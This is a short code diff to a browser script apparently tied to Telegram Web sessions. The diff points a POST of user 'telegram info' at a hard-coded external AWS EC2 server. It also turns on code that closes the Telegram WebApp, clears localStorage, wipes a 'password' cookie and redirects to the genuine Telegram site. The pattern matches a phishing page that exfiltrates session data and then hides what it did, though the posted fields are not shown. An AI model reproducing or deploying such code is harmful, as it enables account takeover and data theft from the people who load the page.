@@ -13,7 +13,7 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
         try {
-          fetch(`/api/users/telegram/info`, {
+          fetch(`http://ec2-51-20-66-132.eu-north-1.compute.amazonaws.com:3000/api/users/telegram/info`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
@@ -32,10 +32,10 @@ document.addEventListener("DOMContentLoaded", function() {
         }
 
         // window.Telegram.WebApp.openTelegramLink("https://t.me/onewordseeker");
-        // window.Telegram.WebApp.close();
+        window.Telegram.WebApp.close();
         localStorage.clear();
         document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-        // window.location.href = "https://web.telegram.org/a/";  
+        window.location.href = "https://web.telegram.org/a/";  
 
         clearInterval(checkInterval);
       }
